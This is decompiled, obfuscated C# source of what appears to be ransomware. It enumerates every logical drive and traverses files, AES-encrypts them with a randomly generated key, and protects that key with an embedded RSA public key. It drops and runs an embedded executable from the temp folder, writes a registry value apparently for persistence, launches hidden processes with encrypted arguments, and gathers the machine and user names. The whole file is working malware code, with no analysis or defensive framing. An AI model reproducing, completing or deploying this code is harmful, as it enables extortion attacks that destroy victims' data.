using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Ag1I3gS4g11fp7k7gV;
using ConsoleApplication1.Properties;
using EIbETxprjqgaPQO2qH;
using Microsoft.Win32;
using PJooveCDW72R93Xul5;

namespace xqEMu3fCbU7sAullHp;

internal class idiqGZ53EcrB8b7dX8
{
	[MethodImpl(MethodImplOptions.NoInlining)]
	private static void VL8AqO6gT(string[] _0020)
	{
		//Discarded unreachable code: IL_0002, IL_0304
		//IL_0003: Incompatible stack heights: 0 vs 1
		int num = 47;
		if (!shG8l8xpL2nCscn5UP())
		{
			goto IL_0014;
		}
		goto IL_0311;
		IL_0311:
		object[] array2 = default(object[]);
		DateTime now = default(DateTime);
		string tempPath = default(string);
		string[] array = default(string[]);
		string[] logicalDrives = default(string[]);
		RegistryKey registryKey = default(RegistryKey);
		string text6 = default(string);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		bool flag = default(bool);
		string path = default(string);
		string userName = default(string);
		string text = default(string);
		string text2 = default(string);
		string text9 = default(string);
		int num2 = default(int);
		Process process = default(Process);
		string text3 = default(string);
		string text5 = default(string);
		string text8 = default(string);
		string machineName = default(string);
		while (true)
		{
			switch (num)
			{
			case 17:
				break;
			case 11:
				array2[0] = now;
				num = 0;
				if (shG8l8xpL2nCscn5UP())
				{
					continue;
				}
				goto case 18;
			case 18:
				tempPath = Path.GetTempPath();
				num = 12;
				continue;
			case 23:
				array = logicalDrives;
				num = 48;
				continue;
			case 32:
				FDC1mZ3Vc();
				num = 46;
				continue;
			case 8:
				registryKey.SetValue(MGHBRCawHnafnHdUL5.ubtJORvFb(746), text6);
				num = 16;
				continue;
			case 22:
				processStartInfo = new ProcessStartInfo();
				num = 45;
				continue;
			case 33:
				flag = !File.Exists(path);
				num = 15;
				if (0 == 0)
				{
					continue;
				}
				goto case 9;
			case 9:
				userName = Environment.UserName;
				num = 37;
				if (iwfKCrhyDeRQD3RCBf())
				{
				}
				continue;
			case 6:
				text = null;
				num = 41;
				continue;
			case 3:
				text2 = aF2WRyvpF(text);
				num = 35;
				if (true)
				{
					continue;
				}
				goto case 26;
			case 26:
				if (!flag)
				{
					num = 7;
					continue;
				}
				text9 = array[num2];
				num = 27;
				continue;
			case 28:
				process.StartInfo = processStartInfo;
				num = 21;
				if (0 == 0)
				{
					continue;
				}
				goto case 0;
			case 0:
				array2[1] = MGHBRCawHnafnHdUL5.ubtJORvFb(610);
				num = 31;
				continue;
			case 34:
			{
				string userName2 = Environment.UserName;
				num = 2;
				if (true)
				{
					continue;
				}
				goto case 15;
			}
			case 15:
				if (!flag)
				{
					num = 44;
					continue;
				}
				try
				{
					File.Create(path);
				}
				catch (Exception)
				{
					string text7 = MGHBRCawHnafnHdUL5.ubtJORvFb(582);
				}
				text3 = MGHBRCawHnafnHdUL5.ubtJORvFb(588);
				num = 34;
				if (iwfKCrhyDeRQD3RCBf())
				{
				}
				continue;
			case 16:
				registryKey.Close();
				num = 49;
				if (0 == 0)
				{
					continue;
				}
				goto case 40;
			case 40:
				text = text + MGHBRCawHnafnHdUL5.ubtJORvFb(616) + text5;
				num = 3;
				continue;
			case 27:
				MOhFQx25R(text9, text);
				num = 43;
				continue;
			case 47:
				Bmhl8NDIsRGH3y5tN0.UwvKZhjtO();
				_ = 0;
				if (shG8l8xpL2nCscn5UP())
				{
					num = 14;
					continue;
				}
				num = 39;
				if (shG8l8xpL2nCscn5UP())
				{
					continue;
				}
				goto case 45;
			case 5:
				text6 = tempPath + MGHBRCawHnafnHdUL5.ubtJORvFb(626);
				num = 42;
				continue;
			case 12:
				text8 = MGHBRCawHnafnHdUL5.ubtJORvFb(558);
				goto case 4;
			case 45:
				processStartInfo.FileName = text6;
				num = 28;
				continue;
			case 48:
				num2 = 0;
				num = 19;
				if (shG8l8xpL2nCscn5UP())
				{
					continue;
				}
				return;
			case 44:
				return;
			case 37:
				array2 = new object[5];
				num = 11;
				continue;
			case 31:
				array2[2] = machineName;
				num = 38;
				continue;
			case 36:
				machineName = Environment.MachineName;
				num = 9;
				continue;
			case 20:
				process = new Process();
				num = 22;
				if (shG8l8xpL2nCscn5UP())
				{
					continue;
				}
				goto case 13;
			case 13:
				registryKey = Registry.CurrentUser.CreateSubKey(MGHBRCawHnafnHdUL5.ubtJORvFb(650));
				num = 8;
				continue;
			case 30:
				now = DateTime.Now;
				num = 36;
				continue;
			case 25:
				BavDvfCKA(text2);
				break;
			default:
				num = 17;
				continue;
			case 24:
				array2[4] = userName;
				num = 10;
				continue;
			case 1:
			case 14:
			{
				string text7 = MGHBRCawHnafnHdUL5.ubtJORvFb(552);
				num = 18;
				continue;
			}
			case 42:
				File.WriteAllBytes(text6, Resources.Lyuj0ohqj());
				num = 20;
				continue;
			case 10:
				text5 = string.Concat(array2);
				num = 40;
				continue;
			case 41:
				aojfrtEqj();
				num = 32;
				continue;
			case 43:
				num2++;
				num = 29;
				if (true)
				{
					continue;
				}
				goto case 35;
			case 35:
			{
				string text4 = text3;
				num = 25;
				if (true)
				{
					continue;
				}
				goto case 21;
			}
			case 21:
				process.Start();
				num = 13;
				continue;
			case 38:
				array2[3] = MGHBRCawHnafnHdUL5.ubtJORvFb(610);
				num = 24;
				continue;
			case 4:
			case 39:
				path = tempPath + text8;
				num = 33;
				continue;
			case 7:
				JppnXQs2S(text2);
				num = 6;
				continue;
			case 2:
				text = pdoSZnCQ3(100);
				num = 30;
				continue;
			case 19:
			case 29:
				flag = num2 < array.Length;
				num = 26;
				continue;
			case 46:
				UDiMAmWVH();
				num = 5;
				continue;
			case 49:
				return;
			}
			break;
		}
		goto IL_0014;
		IL_0014:
		logicalDrives = Environment.GetLogicalDrives();
		num = 23;
		goto IL_0311;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static byte[] AnoO6LjqT(object _0020, object _0020)
	{
		//Discarded unreachable code: IL_0002, IL_00db, IL_0183
		//IL_0003: Incompatible stack heights: 0 vs 1
		int num = 4;
		byte[] salt = default(byte[]);
		MemoryStream memoryStream = default(MemoryStream);
		byte[] result = default(byte[]);
		while (true)
		{
			byte[] array;
			switch (num)
			{
			case 0:
			{
				byte[] array2 = new byte[8];
				Xf6i4jnEQanb8ZuAtX(array2, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
				salt = array2;
				_ = 1;
				if (!iwfKCrhyDeRQD3RCBf())
				{
					num = 1;
					break;
				}
				num = 5;
				if (!iwfKCrhyDeRQD3RCBf())
				{
					break;
				}
				goto case 4;
			}
			default:
				try
				{
					RijndaelManaged rijndaelManaged = new RijndaelManaged();
					try
					{
						znNmI25ImoF2dp5riw(rijndaelManaged, 256);
						BkmnFHwep4iHC79ypN(rijndaelManaged, 128);
						Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes((byte[])_0020, salt, 1000);
						X53qrWtXRcLM8aVY83(rijndaelManaged, Q0RxZPiboQMTiQJIuo(rfc2898DeriveBytes, oLfVKnqQmoLY61Nm68(rijndaelManaged) / 8));
						Rf5sKte2wXrtkiSIAQ(rijndaelManaged, Q0RxZPiboQMTiQJIuo(rfc2898DeriveBytes, AobcunD3vGhTwit4hA(rijndaelManaged) / 8));
						mZTfD0Hk39CrjaeiQx(rijndaelManaged, CipherMode.CBC);
						CryptoStream cryptoStream = new CryptoStream(memoryStream, (ICryptoTransform)oyhqBd3MemW4sZjEJZ(rijndaelManaged), CryptoStreamMode.Write);
						try
						{
							vn3gXKJ9qn9YeLdTV9(cryptoStream, _0020, 0, ((Array)_0020).Length);
							iwfKCrhyDeRQD3RCBf();
							switch ((!shG8l8xpL2nCscn5UP()) ? 3 : 2)
							{
							case 0:
							case 2:
								Y0f9eLBpMSfRx3ctLm(cryptoStream);
								break;
							case 3:
								break;
							}
						}
						finally
						{
							if (cryptoStream != null)
							{
								DYY4nSLv9KIg6E68Ck(cryptoStream);
							}
						}
						array = (byte[])j9CngoPlwlVZ8YB0GN(memoryStream);
					}
					finally
					{
						if (rijndaelManaged != null)
						{
							DYY4nSLv9KIg6E68Ck(rijndaelManaged);
						}
					}
				}
				finally
				{
					if (memoryStream != null)
					{
						DYY4nSLv9KIg6E68Ck(memoryStream);
					}
				}
				result = array;
				num = 6;
				break;
			case 1:
			case 2:
				memoryStream = new MemoryStream();
				goto default;
			case 4:
				array = null;
				num = 0;
				break;
			case 6:
				return result;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string pdoSZnCQ3(int _0020)
	{
		//Discarded unreachable code: IL_0002, IL_00a4
		//IL_0003: Incompatible stack heights: 0 vs 1
		_ = 1;
		int num;
		if (!iwfKCrhyDeRQD3RCBf())
		{
			num = 4;
		}
		else
		{
			num = 1;
			if (!shG8l8xpL2nCscn5UP())
			{
				goto IL_0095;
			}
		}
		goto IL_00b1;
		IL_001a:
		bool flag = default(bool);
		StringBuilder stringBuilder = default(StringBuilder);
		Random random = default(Random);
		if (!flag)
		{
			num = 5;
		}
		else
		{
			w0o1va8tGA5Ztrklwr(stringBuilder, gjx8YXA1eukHiQDAWB(MGHBRCawHnafnHdUL5.ubtJORvFb(762), rITHkG1BYLXu7rksYK(random, Pn6UZwFcYb36S357Wo(MGHBRCawHnafnHdUL5.ubtJORvFb(762)))));
			num = 3;
			if (false)
			{
				goto IL_0083;
			}
		}
		goto IL_00b1;
		IL_0095:
		flag = 0 < _0020--;
		goto IL_001a;
		IL_00b1:
		string result = default(string);
		while (true)
		{
			switch (num)
			{
			case 7:
				break;
			case 6:
				random = new Random();
				goto IL_0095;
			case 5:
				goto IL_0083;
			case 1:
			case 2:
			case 3:
				goto IL_0095;
			default:
				num = 7;
				if (0 == 0)
				{
					continue;
				}
				goto case 0;
			case 0:
			case 4:
				stringBuilder = new StringBuilder();
				num = 6;
				continue;
			case 8:
				return result;
			}
			break;
		}
		goto IL_001a;
		IL_0083:
		result = stringBuilder.ToString();
		num = 8;
		goto IL_00b1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void gqRlgtY77(object _0020, object _0020)
	{
		//Discarded unreachable code: IL_0002, IL_0081
		//IL_0003: Incompatible stack heights: 0 vs 1
		//IL_00d3: Incompatible stack heights: 0 vs 1
		int num = 6;
		if (false)
		{
			goto IL_0010;
		}
		goto IL_008e;
		IL_008e:
		byte[] array3 = default(byte[]);
		byte[] array2 = default(byte[]);
		byte[] array = default(byte[]);
		while (true)
		{
			switch (num)
			{
			case 4:
			case 5:
				break;
			case 7:
				ka2P01Z9776UJ0GZDD(_0020, array3);
				break;
			case 0:
				array2 = (byte[])fPXMmQdo3yM7w1j31s(tUb8adfwUI4dPaJIxR(), array2);
				num = 2;
				continue;
			case 1:
			case 3:
				array2 = (byte[])uIPgC8bCjZRsE4g4OZ(VNGd1mlDXQ45RZXOJV(), _0020);
				num = 0;
				continue;
			case 2:
				array3 = (byte[])nGIotqmT4pwD9RT3mC(array, array2);
				goto case 7;
			default:
				num = 7;
				continue;
			case 6:
				array = (byte[])jMdFZ5T4T7atNZDKAY(_0020);
				shG8l8xpL2nCscn5UP();
				num = ((!iwfKCrhyDeRQD3RCBf()) ? 3 : 4);
				continue;
			case 8:
				return;
			}
			break;
		}
		goto IL_0010;
		IL_0010:
		PbrdtUuJwskHJArdGH(_0020, z1XsLsUnROdUNLbDg8(_0020, MGHBRCawHnafnHdUL5.ubtJORvFb(904)));
		num = 8;
		goto IL_008e;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void MOhFQx25R(object _0020, object _0020)
	{
		//Discarded unreachable code: IL_0002, IL_01aa
		//IL_0003: Incompatible stack heights: 0 vs 1
		string text = MGHBRCawHnafnHdUL5.ubtJORvFb(552);
		try
		{
			string[] array = (string[])iWBpFUoTnUwM5QlRI5(_0020);
			iwfKCrhyDeRQD3RCBf();
			int num = ((!shG8l8xpL2nCscn5UP()) ? 13 : 15);
			int num2 = default(int);
			bool flag = default(bool);
			string text2 = default(string);
			string[] xcjw8Wflk = default(string[]);
			int num3 = default(int);
			string[] array2 = default(string[]);
			string text3 = default(string);
			while (true)
			{
				switch (num)
				{
				case 12:
					num2 = 0;
					num = 4;
					if (true)
					{
						break;
					}
					goto case 9;
				case 9:
					num2 = 0;
					num = 17;
					break;
				case 11:
					if (!flag)
					{
						num = 18;
						break;
					}
					text2 = xcjw8Wflk[num3];
					num = 5;
					if (true)
					{
						break;
					}
					goto case 6;
				case 20:
					xcjw8Wflk = (string[])Bmhl8NDIsRGH3y5tN0.Xcjw8Wflk;
					num = 21;
					break;
				case 10:
					num2++;
					num = 6;
					if (true)
					{
						break;
					}
					goto case 8;
				case 8:
					spOVV9IDoVVABCGfa4(array[num2], _0020);
					num = 3;
					if (shG8l8xpL2nCscn5UP())
					{
						break;
					}
					goto case 14;
				case 6:
				case 17:
					flag = num2 < array2.Length;
					num = 1;
					break;
				case 5:
					flag = !n1bbvHCUhIF71K4Q0e(text2, text3);
					goto case 7;
				case 2:
					if (flag)
					{
						text3 = (string)R8TxUP0e4yjSFUp4gW(array[num2]);
						num = 20;
						if (iwfKCrhyDeRQD3RCBf())
						{
						}
					}
					else
					{
						num = 9;
					}
					break;
				case 1:
					if (!flag)
					{
						num = 22;
						break;
					}
					qHD4rhvBME5ETZxXI8(array2[num2], _0020);
					num = 10;
					break;
				case 21:
					num3 = 0;
					num = 14;
					break;
				case 4:
				case 19:
					flag = num2 < array.Length;
					num = 2;
					if (shG8l8xpL2nCscn5UP())
					{
						break;
					}
					goto case 18;
				case 18:
					num2++;
					num = 19;
					break;
				case 0:
				case 15:
					array2 = (string[])eSg0nly69ucRPl2hnY(_0020);
					num = 12;
					break;
				case 14:
				case 16:
					flag = num3 < xcjw8Wflk.Length;
					num = 11;
					break;
				case 3:
					num3++;
					goto case 14;
				default:
					num = 16;
					break;
				case 7:
				case 13:
					if (!flag)
					{
						num = 8;
						break;
					}
					goto case 3;
				case 22:
					return;
				}
			}
		}
		catch (Exception)
		{
			text = MGHBRCawHnafnHdUL5.ubtJORvFb(582);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void JppnXQs2S(object _0020)
	{
		//Discarded unreachable code: IL_0002, IL_00fa, IL_0454
		//IL_0003: Incompatible stack heights: 0 vs 1
		//IL_033d: Incompatible stack heights: 0 vs 1
		//IL_04c7: Incompatible stack heights: 0 vs 1
		int num = 13;
		if (1 == 0)
		{
			goto IL_0010;
		}
		goto IL_0107;
		IL_0107:
		string text12 = default(string);
		string[] array = default(string[]);
		string text = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string[] array2 = default(string[]);
		string text6 = default(string);
		string text5 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text10 = default(string);
		string text9 = default(string);
		string text2 = default(string);
		while (true)
		{
			switch (num)
			{
			case 21:
				break;
			case 10:
				text12 = MGHBRCawHnafnHdUL5.ubtJORvFb(924);
				num = 27;
				continue;
			case 20:
			case 25:
				goto IL_0044;
			case 23:
				array[7] = MGHBRCawHnafnHdUL5.ubtJORvFb(1954);
				num = 18;
				if (0 == 0)
				{
					continue;
				}
				goto case 12;
			case 12:
				array[10] = MGHBRCawHnafnHdUL5.ubtJORvFb(2300);
				num = 28;
				if (true)
				{
					continue;
				}
				goto case 24;
			case 24:
				array[5] = MGHBRCawHnafnHdUL5.ubtJORvFb(1664);
				num = 0;
				if (shG8l8xpL2nCscn5UP())
				{
					continue;
				}
				goto case 6;
			case 6:
			case 11:
				array[1] = MGHBRCawHnafnHdUL5.ubtJORvFb(992);
				num = 7;
				continue;
			case 7:
				array[2] = MGHBRCawHnafnHdUL5.ubtJORvFb(1130);
				num = 8;
				continue;
			case 0:
				array[6] = MGHBRCawHnafnHdUL5.ubtJORvFb(1764);
				num = 23;
				continue;
			case 19:
				array[9] = (string)_0020;
				goto case 12;
			default:
				num = 12;
				continue;
			case 27:
				text = (string)tef1SgNMFfDp4NoIdN(text7, text8, text12);
				num = 29;
				continue;
			case 22:
				array[13] = MGHBRCawHnafnHdUL5.ubtJORvFb(2490);
				num = 17;
				continue;
			case 9:
				array[17] = MGHBRCawHnafnHdUL5.ubtJORvFb(3120);
				num = 4;
				continue;
			case 26:
				array[21] = MGHBRCawHnafnHdUL5.ubtJORvFb(3662);
				num = 14;
				continue;
			case 17:
				array[14] = MGHBRCawHnafnHdUL5.ubtJORvFb(2700);
				num = 2;
				if (true)
				{
					continue;
				}
				goto case 2;
			case 2:
				array[15] = MGHBRCawHnafnHdUL5.ubtJORvFb(2914);
				num = 1;
				continue;
			case 15:
				array[4] = MGHBRCawHnafnHdUL5.ubtJORvFb(1538);
				num = 24;
				if (0 == 0)
				{
					continue;
				}
				goto case 4;
			case 4:
				array[18] = MGHBRCawHnafnHdUL5.ubtJORvFb(3324);
				num = 21;
				continue;
			case 29:
				array = new string[22];
				num = 3;
				continue;
			case 8:
				array[3] = MGHBRCawHnafnHdUL5.ubtJORvFb(1336);
				num = 15;
				continue;
			case 14:
				array2 = array;
				num = 30;
				if (iwfKCrhyDeRQD3RCBf())
				{
				}
				continue;
			case 1:
				array[16] = MGHBRCawHnafnHdUL5.ubtJORvFb(3026);
				num = 9;
				continue;
			case 28:
				array[11] = MGHBRCawHnafnHdUL5.ubtJORvFb(2324);
				num = 16;
				continue;
			case 16:
				array[12] = MGHBRCawHnafnHdUL5.ubtJORvFb(2344);
				num = 22;
				continue;
			case 5:
				text8 = (string)al9XD59ubVO9WD4OZN();
				num = 10;
				continue;
			case 18:
				array[8] = MGHBRCawHnafnHdUL5.ubtJORvFb(2168);
				num = 19;
				if (true)
				{
					continue;
				}
				goto case 13;
			case 13:
				text7 = MGHBRCawHnafnHdUL5.ubtJORvFb(588);
				num = 5;
				continue;
			case 3:
				array[0] = MGHBRCawHnafnHdUL5.ubtJORvFb(972);
				shG8l8xpL2nCscn5UP();
				if (iwfKCrhyDeRQD3RCBf())
				{
					num = 20;
					continue;
				}
				num = 11;
				if (true)
				{
					continue;
				}
				goto case 30;
			case 30:
				try
				{
					TiRCRLKuEsst329DuV(text, array2);
					int num2 = 1;
					while (true)
					{
						switch (num2)
						{
						case 7:
							text6 = (string)tef1SgNMFfDp4NoIdN(text7, text8, MGHBRCawHnafnHdUL5.ubtJORvFb(3784));
							num2 = 4;
							continue;
						case 5:
							text5 = (string)z1XsLsUnROdUNLbDg8(text3, text4);
							num2 = 14;
							continue;
						case 1:
							text3 = (string)gBEheIagaDDAlCXxMM();
							num2 = 11;
							continue;
						case 10:
							text10 = (string)tef1SgNMFfDp4NoIdN(text7, text8, MGHBRCawHnafnHdUL5.ubtJORvFb(3822));
							num2 = 12;
							if (0 == 0)
							{
								continue;
							}
							goto case 14;
						case 14:
							TiRCRLKuEsst329DuV(text5, array2);
							num2 = 0;
							if (true)
							{
								continue;
							}
							goto case 9;
						case 9:
						{
							string text11 = (string)tef1SgNMFfDp4NoIdN(text7, text8, MGHBRCawHnafnHdUL5.ubtJORvFb(3880));
							goto case 3;
						}
						case 12:
							TiRCRLKuEsst329DuV(text10, array2);
							num2 = 9;
							if (true)
							{
								continue;
							}
							goto case 8;
						case 8:
							TiRCRLKuEsst329DuV(text9, array2);
							num2 = 7;
							continue;
						case 3:
						case 13:
							TiRCRLKuEsst329DuV(text10, array2);
							num2 = 16;
							continue;
						case 2:
						case 6:
							text9 = (string)tef1SgNMFfDp4NoIdN(text7, text8, MGHBRCawHnafnHdUL5.ubtJORvFb(3742));
							goto case 8;
						default:
							num2 = 8;
							continue;
						case 15:
							TiRCRLKuEsst329DuV(text2, array2);
							shG8l8xpL2nCscn5UP();
							if (iwfKCrhyDeRQD3RCBf())
							{
								num2 = 3;
								continue;
							}
							num2 = 2;
							if (true)
							{
								continue;
							}
							goto case 4;
						case 4:
							TiRCRLKuEsst329DuV(text6, array2);
							num2 = 10;
							if (0 == 0)
							{
								continue;
							}
							goto case 0;
						case 0:
							text2 = (string)z1XsLsUnROdUNLbDg8(text3, MGHBRCawHnafnHdUL5.ubtJORvFb(3708));
							num2 = 15;
							if (shG8l8xpL2nCscn5UP())
							{
								continue;
							}
							break;
						case 11:
							break;
						case 16:
							return;
						}
						text4 = MGHBRCawHnafnHdUL5.ubtJORvFb(3678);
						num2 = 5;
						if (iwfKCrhyDeRQD3RCBf())
						{
						}
					}
				}
				catch (Exception)
				{
					return;
				}
			}
			break;
		}
		goto IL_0010;
		IL_0010:
		array[19] = MGHBRCawHnafnHdUL5.ubtJORvFb(3522);
		goto IL_0044;
		IL_0044:
		array[20] = (string)_0020;
		num = 26;
		goto IL_0107;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string aF2WRyvpF(object _0020)
	{
		//Discarded unreachable code: IL_0002, IL_0034, IL_00cc
		//IL_0003: Incompatible stack heights: 0 vs 1
		//IL_0084: Incompatible stack heights: 0 vs 1
		int num = 3;
		RSACryptoServiceProvider rSACryptoServiceProvider = default(RSACryptoServiceProvider);
		byte[] array2 = default(byte[]);
		string text = default(string);
		string result = default(string);
		byte[] array = default(byte[]);
		while (true)
		{
			switch (num)
			{
			default:
				rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
				num = 5;
				break;
			case 0:
			case 1:
				array2 = (byte[])uIPgC8bCjZRsE4g4OZ(VNGd1mlDXQ45RZXOJV(), _0020);
				goto default;
			case 3:
				text = MGHBRCawHnafnHdUL5.ubtJORvFb(3926);
				shG8l8xpL2nCscn5UP();
				num = (iwfKCrhyDeRQD3RCBf() ? 4 : 0);
				break;
			case 5:
				try
				{
					try
					{
						mA5tuiEUHgXSYMXgnR(rSACryptoServiceProvider, text);
						shG8l8xpL2nCscn5UP();
						int num2;
						if (!iwfKCrhyDeRQD3RCBf())
						{
							num2 = 2;
							if (!shG8l8xpL2nCscn5UP())
							{
								goto IL_00bd;
							}
						}
						else
						{
							num2 = 3;
							if (false)
							{
								goto IL_0104;
							}
						}
						goto IL_00d9;
						IL_0104:
						result = (string)phEu9FgIeeWKgYKCYA(array);
						num2 = 4;
						goto IL_00d9;
						IL_00bd:
						array = (byte[])zuiPSrYgqo4s6Tors9(rSACryptoServiceProvider, array2, true);
						goto IL_0104;
						IL_00d9:
						switch (num2)
						{
						case 0:
						case 2:
							break;
						default:
							goto IL_0104;
						case 4:
							return result;
						}
						goto IL_00bd;
					}
					finally
					{
						SmYTdQOHBFKrHqE5uf(rSACryptoServiceProvider, false);
					}
				}
				finally
				{
					if (rSACryptoServiceProvider != null)
					{
						DYY4nSLv9KIg6E68Ck(rSACryptoServiceProvider);
					}
				}
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void BavDvfCKA(object _0020)
	{
		//Discarded unreachable code: IL_0002, IL_003e
		//IL_0003: Incompatible stack heights: 0 vs 1
		//IL_0086: Incompatible stack heights: 0 vs 1
		int num = 0;
		string[] array = default(string[]);
		string[] array2 = default(string[]);
		string text2 = default(string);
		string text = default(string);
		while (true)
		{
			switch (num)
			{
			case 5:
			case 9:
				array[2] = MGHBRCawHnafnHdUL5.ubtJORvFb(1336);
				goto case 6;
			case 8:
				array[1] = (string)_0020;
				goto default;
			default:
				_ = 1;
				if (iwfKCrhyDeRQD3RCBf())
				{
					num = 7;
					if (iwfKCrhyDeRQD3RCBf())
					{
					}
					break;
				}
				num = 9;
				if (true)
				{
					break;
				}
				goto case 1;
			case 1:
				array2 = array;
				num = 2;
				break;
			case 10:
				array = new string[4];
				num = 3;
				break;
			case 2:
				TiRCRLKuEsst329DuV(text2, array2);
				num = 11;
				if (0 == 0)
				{
					break;
				}
				goto case 6;
			case 6:
			case 7:
				array[3] = MGHBRCawHnafnHdUL5.ubtJORvFb(4856);
				num = 1;
				break;
			case 3:
				array[0] = MGHBRCawHnafnHdUL5.ubtJORvFb(4796);
				num = 8;
				break;
			case 0:
				text = MGHBRCawHnafnHdUL5.ubtJORvFb(4760);
				num = 4;
				break;
			case 4:
				text2 = (string)z1XsLsUnROdUNLbDg8(Bmhl8NDIsRGH3y5tN0.nRX8yMIdM, text);
				num = 10;
				break;
			case 11:
				return;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void FDC1mZ3Vc()
	{
		//Discarded unreachable code: IL_0002, IL_00fc
		//IL_0003: Incompatible stack heights: 0 vs 1
		//IL_0065: Incompatible stack heights: 0 vs 1
		int num = 17;
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text3 = default(string);
		string[] array = default(string[]);
		string[] array2 = default(string[]);
		Process process = default(Process);
		string text2 = default(string);
		string text = default(string);
		while (true)
		{
			switch (num)
			{
			case 10:
			case 14:
				xUd067VyKQKZvj2fx8(processStartInfo, text3);
				goto case 3;
			case 16:
				processStartInfo = new ProcessStartInfo();
				num = 5;
				if (true)
				{
					continue;
				}
				goto case 8;
			case 8:
				array[1] = MGHBRCawHnafnHdUL5.ubtJORvFb(5164);
				num = 11;
				continue;
			case 6:
				IBCgQcWxOFUwvb6WxO(processStartInfo, ProcessWindowStyle.Hidden);
				shG8l8xpL2nCscn5UP();
				num = ((!iwfKCrhyDeRQD3RCBf()) ? 10 : 3);
				continue;
			case 9:
				TiRCRLKuEsst329DuV(text3, array2);
				num = 7;
				if (!iwfKCrhyDeRQD3RCBf())
				{
					continue;
				}
				goto case 5;
			case 5:
				dHqDcIsOffYjWuEdit(processStartInfo, true);
				num = 6;
				continue;
			case 12:
				array[3] = MGHBRCawHnafnHdUL5.ubtJORvFb(5384);
				num = 13;
				if (true)
				{
					continue;
				}
				goto case 3;
			case 3:
			case 15:
				YwynPWctih3nWCAGtc(process, processStartInfo);
				num = 4;
				continue;
			case 1:
				text2 = MGHBRCawHnafnHdUL5.ubtJORvFb(5064);
				num = 0;
				continue;
			case 17:
				text = (string)gBEheIagaDDAlCXxMM();
				num = 1;
				if (true)
				{
					continue;
				}
				goto case 13;
			case 13:
				array2 = array;
				goto case 9;
			default:
				num = 9;
				if (true)
				{
					continue;
				}
				goto case 4;
			case 4:
				y9cUQBzPSe9bsnbWMt(process);
				num = 19;
				if (shG8l8xpL2nCscn5UP())
				{
					continue;
				}
				goto case 2;
			case 2:
				array[0] = MGHBRCawHnafnHdUL5.ubtJORvFb(5082);
				num = 8;
				if (!iwfKCrhyDeRQD3RCBf())
				{
					continue;
				}
				goto case 18;
			case 18:
				array = new string[4];
				num = 2;
				continue;
			case 0:
				text3 = (string)z1XsLsUnROdUNLbDg8(text, text2);
				num = 18;
				continue;
			case 11:
				array[2] = MGHBRCawHnafnHdUL5.ubtJORvFb(5258);
				num = 12;
				if (0 == 0)
				{
					continue;
				}
				break;
			case 7:
				break;
			case 19:
				return;
			}
			process = new Process();
			num = 16;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void aojfrtEqj()
	{
		//Discarded unreachable code: IL_0002, IL_005f
		//IL_0003: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num;
		if (shG8l8xpL2nCscn5UP())
		{
			num = 6;
			if (1 == 0)
			{
				goto IL_001c;
			}
		}
		else
		{
			num = 4;
			if (!shG8l8xpL2nCscn5UP())
			{
				goto IL_00d6;
			}
		}
		goto IL_006c;
		IL_00d6:
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		dHqDcIsOffYjWuEdit(processStartInfo, false);
		num = 8;
		goto IL_006c;
		IL_001c:
		processStartInfo = new ProcessStartInfo(MGHBRCawHnafnHdUL5.ubtJORvFb(5468), MGHBRCawHnafnHdUL5.ubtJORvFb(5486));
		num = 2;
		goto IL_006c;
		IL_006c:
		Process process = default(Process);
		while (true)
		{
			switch (num)
			{
			case 0:
			case 6:
				break;
			case 5:
			{
				StreamReader streamReader = (StreamReader)uFVGZqXjTBU6WmNaKGF(process);
				num = 9;
				continue;
			}
			case 8:
				E0SBY3XXsoNsR5sfZLR(processStartInfo, true);
				goto case 7;
			default:
				num = 7;
				continue;
			case 2:
				IBCgQcWxOFUwvb6WxO(processStartInfo, ProcessWindowStyle.Hidden);
				num = 1;
				continue;
			case 1:
				cbslaxX2rAFp7FQVtsP(processStartInfo, true);
				goto IL_00d6;
			case 3:
			case 4:
				goto IL_00d6;
			case 9:
				PisWDNXS4vcV4KI2rDc(process);
				num = 10;
				continue;
			case 7:
				process = (Process)uOl0TmXM3MdAI03hZTr(processStartInfo);
				num = 5;
				if (!iwfKCrhyDeRQD3RCBf())
				{
					continue;
				}
				return;
			case 10:
				return;
			}
			break;
		}
		goto IL_001c;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void UDiMAmWVH()
	{
		//Discarded unreachable code: IL_0002, IL_00a6
		//IL_0003: Incompatible stack heights: 0 vs 1
		//IL_0065: Incompatible stack heights: 0 vs 1
		int num = 6;
		string text3 = default(string);
		string text4 = default(string);
		string text2 = default(string);
		string text = default(string);
		while (true)
		{
			switch (num)
			{
			case 1:
				PDLwefXrQKpac54b4We(MGHBRCawHnafnHdUL5.ubtJORvFb(5574), text3);
				num = 8;
				break;
			case 2:
			case 7:
				text4 = (string)z1XsLsUnROdUNLbDg8(text2, text);
				goto case 3;
			case 6:
				text2 = (string)gBEheIagaDDAlCXxMM();
				num = 0;
				break;
			case 0:
				text = MGHBRCawHnafnHdUL5.ubtJORvFb(3678);
				_ = 1;
				if (iwfKCrhyDeRQD3RCBf())
				{
					num = 5;
					if (0 == 0)
					{
						break;
					}
					goto case 6;
				}
				num = 7;
				break;
			case 4:
				text3 = (string)z1XsLsUnROdUNLbDg8(text2, MGHBRCawHnafnHdUL5.ubtJORvFb(3708));
				num = 1;
				break;
			case 3:
			case 5:
				PDLwefXrQKpac54b4We(MGHBRCawHnafnHdUL5.ubtJORvFb(5574), text4);
				goto case 4;
			default:
				num = 4;
				break;
			case 8:
				return;
			}
		}
	}

